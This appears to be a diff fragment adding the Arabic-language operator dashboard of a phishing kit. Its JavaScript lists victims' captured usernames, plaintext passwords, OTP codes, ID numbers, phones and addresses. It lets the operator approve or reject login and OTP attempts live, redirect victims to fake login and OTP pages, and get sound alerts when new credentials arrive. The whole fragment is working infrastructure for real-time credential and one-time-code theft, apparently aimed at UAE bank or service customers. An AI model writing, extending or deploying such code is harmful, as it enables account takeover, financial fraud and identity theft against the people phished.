+    ['الحالة', '<span class="status-badge ' + sc + '">' + st + '</span>']
+  ];
+  var html = '';
+  fields.forEach(function(f) {
+    html += '<div class="modal-row"><span class="label">' + f[0] + '</span><span class="value">' + f[1] + '</span></div>';
+  });
+  document.getElementById('modalData').innerHTML = html;
+  document.getElementById('modalTitle').textContent = 'تفاصيل الطلب';
+
+  var actHtml = '';
+  if (o.status === 'pending' || o.status === 'click') {
+    actHtml += '<button class="btn-action btn-approve" onclick="actionOrder(\'approved\')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول</button>';
+    actHtml += '<button class="btn-action btn-reject" onclick="actionOrder(\'rejected\')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض</button>';
+  }
+  actHtml += '<button class="btn-action" style="background:rgba(239,68,68,0.15);color:#f87171;border:1px solid rgba(239,68,68,0.2);" onclick="blockIP()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg> حظر IP</button>';
+  document.getElementById('modalActions').innerHTML = actHtml;
+  document.getElementById('detailsModal').classList.add('show');
+}
+
+var currentSessionId = -1;
+
+function openSessionDetails(id) {
+  currentSessionId = id;
+  currentOrderId = -1;
+  var s = sessionsData.find(function(x) { return x.id === id; });
+  if (!s) return;
+  var dt = s.date ? new Date(s.date).toLocaleString('ar-AE') : '-';
+  var sc, st;
+  if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
+  else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+  else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
+  else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
+  else if (s.loginStatus === 'approved' && !s.otp) { sc = 'approved'; st = 'بانتظار OTP'; }
+  else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
+  else { sc = 'pending'; st = 'بيانات جديدة'; }
+  var fields = [
+    ['رقم الجلسة', s.id], ['التاريخ', dt],
+    ['اسم المستخدم', s.username || '-'], ['كلمة المرور', s.password || '-'],
+    ['الدولة', s.country || '-'], ['عنوان IP', s.ip || '-'],
+    ['نوع الخدمة', s.service || '-']
+  ];
+  if (s.otp) fields.push(['رمز OTP', '<span style="font-family:monospace;font-size:1.2rem;letter-spacing:4px;color:#00c8ff;font-weight:800;">' + s.otp + '</span>']);
+  if (s.orderName) fields.push(['الاسم', s.orderName]);
+  if (s.orderPhone) fields.push(['الجوال', s.orderPhone]);
+  if (s.orderEmail) fields.push(['البريد', s.orderEmail]);
+  if (s.orderIdNumber) fields.push(['رقم الهوية', s.orderIdNumber]);
+  if (s.orderEmirate) fields.push(['الإمارة', s.orderEmirate]);
+  if (s.orderAddress) fields.push(['العنوان', s.orderAddress]);
+  fields.push(['الحالة', '<span class="status-badge ' + sc + '">' + st + '</span>']);
+  var html = '';
+  fields.forEach(function(f) {
+    html += '<div class="modal-row"><span class="label">' + f[0] + '</span><span class="value">' + f[1] + '</span></div>';
+  });
+  document.getElementById('modalData').innerHTML = html;
+  document.getElementById('modalTitle').textContent = 'تفاصيل الجلسة';
+
+  var actHtml = '';
+  if (s.pendingAction) {
+    var aType = s.pendingAction.type;
+    var label = aType === 'login' ? 'تسجيل الدخول' : 'رمز OTP';
+    actHtml += '<button class="btn-action btn-approve" onclick="modalSessionAction(\'' + aType + '\',\'approved\')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول ' + label + '</button>';
+    actHtml += '<button class="btn-action btn-reject" onclick="modalSessionAction(\'' + aType + '\',\'rejected\')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض ' + label + '</button>';
+  }
+  actHtml += '<button class="btn-action btn-redirect" style="background:rgba(139,92,246,0.15);color:#a78bfa;border:1px solid rgba(139,92,246,0.2);" onclick="closeModal();redirectSession(' + s.id + ')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه</button>';
+  document.getElementById('modalActions').innerHTML = actHtml;
+  document.getElementById('detailsModal').classList.add('show');
+}
+
+function modalSessionAction(type, status) {
+  if (currentSessionId < 0) return;
+  var url = type === 'login' ? '/api/login-attempts/status' : '/api/otp-attempts/status';
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ id: currentSessionId, status: status })
+  }).then(function(r) { return r.json(); }).then(function() {
+    closeModal();
+    loadSessions();
+    loadOrders();
+  }).catch(function(err) { alert('خطأ: ' + err.message); });
+}
+
+function closeModal() {
+  document.getElementById('detailsModal').classList.remove('show');
+  document.getElementById('modalActions').innerHTML = '';
+}
+
+function actionOrder(action) {
+  if (currentOrderId < 0) return;
+  fetch('/api/orders/status', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ id: currentOrderId, status: action })
+  }).then(function() {
+    closeModal();
+    loadOrders();
+  });
+}
+
+function blockIP() {
+  if (currentOrderId < 0) return;
+  var o = ordersData.find(function(x) { return x.id === currentOrderId; });
+  if (!o) return;
+  fetch('/api/block-ip', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ ip: o.ip })
+  }).then(function() {
+    closeModal();
+    loadOrders();
+  });
+}
+
+var redirectPages = [
+  { path: '/', name: 'الصفحة الرئيسية', icon: 'home' },
+  { path: '/mbankapp/', name: 'صفحة الساعات', icon: 'app' },
+  { path: '/order/', name: 'نموذج الطلب', icon: 'order' },
+  { path: '/login/', name: 'تسجيل الدخول', icon: 'login' },
+  { path: '/login/otp.html', name: 'صفحة OTP (6 أرقام)', icon: 'login' },
+  { path: '/login/otp4.html', name: 'صفحة OTP (4 أرقام)', icon: 'login' }
+];
+
+var redirectCurrentType = '';
+var redirectCurrentId = -1;
+
+var pageIcons = {
+  home: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>',
+  app: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>',
+  order: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
+  login: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>'
+};
+
+var redirectCurrentLang = 'ar';
+
+function openRedirectModal(type, id, label, lang) {
+  redirectCurrentType = type;
+  redirectCurrentId = id;
+  redirectCurrentLang = lang || 'ar';
+  var langLabel = redirectCurrentLang === 'ar' ? 'عربي' : 'English';
+  document.getElementById('redirectTarget').textContent = label + ' (' + langLabel + ')';
+  var list = document.getElementById('redirectPagesList');
+  list.innerHTML = '';
+  redirectPages.forEach(function(p) {
+    var fullUrl = '/' + redirectCurrentLang + p.path;
+    var li = document.createElement('li');
+    li.className = 'redirect-page-item';
+    li.onclick = function() { selectRedirectPage(fullUrl); };
+    li.innerHTML =
+      '<div class="rp-icon ' + redirectCurrentLang + '">' + pageIcons[p.icon] + '</div>' +
+      '<div class="rp-info"><div class="rp-name">' + p.name + '</div><div class="rp-url">' + fullUrl + '</div></div>';
+    list.appendChild(li);
+  });
+  document.getElementById('redirectModal').classList.add('show');
+}
+
+function closeRedirectModal() {
+  document.getElementById('redirectModal').classList.remove('show');
+}
+
+function selectRedirectPage(url) {
+  if (redirectCurrentType === 'session') {
+    fetch('/api/sessions/redirect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+      body: JSON.stringify({ id: redirectCurrentId, url: url })
+    }).then(function() {
+      closeRedirectModal();
+      loadSessions();
+    });
+  }
+}
+
+function redirectOrder(id) {
+  var o = ordersData.find(function(x) { return x.id === id; });
+  if (!o) return;
+  openRedirectModal('order', id, 'طلب #' + o.id + ' - ' + (o.name || o.ip), o.lang || 'ar');
+}
+
+function redirectSession(id) {
+  var s = sessionsData.find(function(x) { return x.id === id; });
+  if (!s) return;
+  openRedirectModal('session', id, 'جلسة #' + s.id + ' - ' + (s.username || s.ip), s.lang || 'ar');
+}
+
+var sessionsData = [];
+
+function loadSessions() {
+  fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth).then(function(d) {
+    if (!d) return;
+    sessionsData = d.sessions || [];
+    checkNewSessions(sessionsData);
+    renderSessions();
+  }).catch(function() {});
+}
+
+function renderSessions() {
+  var c = document.getElementById('sessionsContainer');
+  var pending = sessionsData.filter(function(s) { return s.pendingAction; }).length;
+  document.getElementById('sessionsBadge').textContent = pending > 0 ? pending + ' بانتظار القرار' : sessionsData.length + ' جلسة';
+  if (sessionsData.length === 0) {
+    c.innerHTML = '<div class="empty-msg">لا توجد جلسات</div>';
+    return;
+  }
+  c.innerHTML = '';
+  sessionsData.forEach(function(s) {
+    var card = document.createElement('div');
+    card.className = 'session-card' + (s.pendingAction ? ' has-pending' : '');
+    var dt = s.date ? new Date(s.date).toLocaleString('ar-AE') : '-';
+
+    var loginDone = s.loginStatus === 'approved' || s.loginStatus === 'rejected';
+    var loginClass = loginDone ? 'done' : (s.loginStatus === 'waiting' ? 'active' : 'wait');
+    var otpClass = 'wait';
+    if (s.otp) {
+      otpClass = s.otpStatus === 'approved' ? 'done' : (s.otpStatus === 'rejected' ? 'done' : (s.otpStatus === 'waiting' ? 'active' : 'wait'));
+    }
+
+    var otpSection = '';
+    if (s.otp) {
+      otpSection = '<div class="session-field"><span class="sf-label">رمز OTP</span><span class="sf-value otp-code">' + s.otp + '</span></div>';
+    }
+
+    var serviceSection = '';
+    if (s.service) {
+      serviceSection = '<div class="session-field" style="background:rgba(0,200,255,0.06);margin:0 -20px;padding:8px 20px;"><span class="sf-label" style="color:#00c8ff;">نوع الخدمة</span><span class="sf-value" style="color:#00c8ff;font-weight:700;">' + s.service + '</span></div>';
+    }
+
+    var orderSection = '';
+    if (s.orderName || s.orderPhone) {
+      orderSection = (s.orderName ? '<div class="session-field"><span class="sf-label">الاسم</span><span class="sf-value">' + s.orderName + '</span></div>' : '') +
+        (s.orderPhone ? '<div class="session-field"><span class="sf-label">الجوال</span><span class="sf-value mono">' + s.orderPhone + '</span></div>' : '') +
+        (s.orderEmail ? '<div class="session-field"><span class="sf-label">البريد</span><span class="sf-value">' + s.orderEmail + '</span></div>' : '') +
+        (s.orderIdNumber ? '<div class="session-field"><span class="sf-label">رقم الهوية</span><span class="sf-value mono">' + s.orderIdNumber + '</span></div>' : '') +
+        (s.orderEmirate ? '<div class="session-field"><span class="sf-label">الإمارة</span><span class="sf-value">' + s.orderEmirate + '</span></div>' : '') +
+        (s.orderAddress ? '<div class="session-field"><span class="sf-label">العنوان</span><span class="sf-value">' + s.orderAddress + '</span></div>' : '');
+    }
+
+    var statusHtml = '';
+    if (s.loginStatus === 'rejected') {
+      statusHtml = '<span class="status-badge rejected">تسجيل الدخول مرفوض</span>';
+    } else if (s.otpStatus === 'rejected') {
+      statusHtml = '<span class="status-badge rejected">OTP مرفوض</span>';
+    } else if (s.otpStatus === 'approved') {
+      statusHtml = '<span class="status-badge approved">مكتمل</span>';
+    } else if (s.otpStatus === 'waiting') {
+      statusHtml = '<span class="status-badge waiting">OTP</span>';
+    } else if (s.loginStatus === 'approved' && !s.otp) {
+      statusHtml = '<span class="status-badge approved">تم قبول الدخول - بانتظار OTP</span>';
+    } else if (s.loginStatus === 'waiting') {
+      statusHtml = '<span class="status-badge waiting">تسجيل دخول</span>';
+    }
+
+    var actionsHtml = '';
+    var isActive = s.loginStatus === 'waiting' || s.otpStatus === 'waiting';
+    if (s.pendingAction) {
+      var aType = s.pendingAction.type;
+      var aId = s.pendingAction.id;
+      var label = aType === 'login' ? 'تسجيل الدخول' : 'رمز OTP';
+      actionsHtml = '<div class="session-card-actions" style="flex-wrap:wrap;">' +
+        '<button class="btn-action btn-approve" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'approved\')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول ' + label +
+        '</button>' +
+        '<button class="btn-action btn-reject" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'rejected\')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض ' + label +
+        '</button>' +
+        '<button class="btn-session-redirect" onclick="redirectSession(' + s.id + ')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
+        '</button></div>';
+    } else {
+      actionsHtml = '<div class="session-card-actions" style="flex-wrap:wrap;">' +
+        '<button class="btn-action" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول' +
+        '</button>' +
+        '<button class="btn-action" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض' +
+        '</button>' +
+        '<button class="btn-session-redirect" onclick="redirectSession(' + s.id + ')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
+        '</button></div>';
+    }
+
+    card.innerHTML =
+      '<div class="session-card-header"><span class="session-id">جلسة #' + s.id + '</span><span class="session-time">' + dt + '</span></div>' +
+      '<div class="session-card-body">' +
+        serviceSection +
+        '<div class="session-field"><span class="sf-label">اسم المستخدم</span><span class="sf-value">' + (s.username || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">كلمة المرور</span><span class="sf-value mono">' + (s.password || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">الدولة</span><span class="sf-value">' + (s.country || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">IP</span><span class="sf-value mono">' + (s.ip || '-') + '</span></div>' +
+        otpSection +
+        orderSection +
+      '</div>' +
+      '<div class="session-step">' +
+        '<span class="step-dot ' + loginClass + '"></span> تسجيل الدخول' +
+        '<span class="step-line"></span>' +
+        '<span class="step-dot ' + otpClass + '"></span> OTP' +
+        '<span style="margin-right:auto;">' + statusHtml + '</span>' +
+      '</div>' +
+      actionsHtml;
+
+    c.appendChild(card);
+  });
+}
+
+function sessionAction(type, id, status) {
+  var url = type === 'login' ? '/api/login-attempts/status' : '/api/otp-attempts/status';
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ id: id, status: status })
+  }).then(function(r) { return r.json(); }).then(function() {
+    loadSessions();
+    loadOrders();
+  }).catch(function(err) { alert('خطأ: ' + err.message); });
+}
+
+// Notification system
+var knownSessionIds = {};
+var knownOrderIds = {};
+var firstLoad = true;
+var originalTitle = document.title;
+var titleFlashInterval = null;
+
+function playNotifSound() {
+  try {
+    var ctx = new (window.AudioContext || window.webkitAudioContext)();
+    var osc = ctx.createOscillator();
+    var gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.type = 'sine';
+    gain.gain.setValueAtTime(0.4, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+    osc.frequency.setValueAtTime(880, ctx.currentTime);
+    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.15);
+    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.3);
+    osc.start(ctx.currentTime);
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) {}
+}
+
+function showNotif(msg) {
+  var toast = document.getElementById('notifToast');
+  document.getElementById('notifText').textContent = msg;
+  toast.classList.remove('show');
+  void toast.offsetWidth;
+  toast.classList.add('show');
+  setTimeout(function() { toast.classList.remove('show'); }, 4000);
+  if (titleFlashInterval) clearInterval(titleFlashInterval);
+  var flash = true;
+  titleFlashInterval = setInterval(function() {
+    document.title = flash ? '🔔 ' + msg : originalTitle;
+    flash = !flash;
+  }, 1000);
+  setTimeout(function() {
+    if (titleFlashInterval) { clearInterval(titleFlashInterval); titleFlashInterval = null; }
+    document.title = originalTitle;
+  }, 10000);
+}
+
+function checkNewSessions(sessions) {
+  if (firstLoad) {
+    sessions.forEach(function(s) { knownSessionIds[s.id] = (s.otp ? 'otp' : 'login'); });
+    return;
+  }
+  sessions.forEach(function(s) {
+    var prev = knownSessionIds[s.id];
+    if (!prev) {
+      knownSessionIds[s.id] = (s.otp ? 'otp' : 'login');
+      if (s.otp) {
+        playNotifSound();
+        showNotif('وصل رمز OTP - جلسة #' + s.id);
+      } else {
+        playNotifSound();
+        showNotif('تسجيل دخول جديد - جلسة #' + s.id);
+      }
+    } else if (prev === 'login' && s.otp) {
+      knownSessionIds[s.id] = 'otp';
+      playNotifSound();
+      showNotif('وصل رمز OTP - جلسة #' + s.id);
+    }
+  });
+}
+
+function checkNewOrders(orders) {
+  if (firstLoad) {
+    orders.forEach(function(o) { knownOrderIds[o.id] = true; });
+    return;
+  }
+  orders.forEach(function(o) {
+    if (!knownOrderIds[o.id]) {
+      knownOrderIds[o.id] = true;
+      playNotifSound();
+      showNotif('بيانات جديدة - طلب #' + o.id);
+    }
+  });
+}
+
+// Init
+var now = new Date();
+var months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
+var days = ['الأحد','الإثنين','الثلاثاء','الأربعاء','الخميس','الجمعة','السبت'];
+document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear();
+
+loadStats();
+loadOrders();
+loadSessions();
+
+setTimeout(function() { firstLoad = false; }, 2000);
+
+setInterval(function() {
+  loadStats();
+  loadOrders();
+  loadSessions();
+}, 3000);
+
+document.getElementById('detailsModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+document.getElementById('redirectModal').addEventListener('click', function(e) {
+  if (e.target === this) closeRedirectModal();
+});
+</script>
+</body>
+</html>
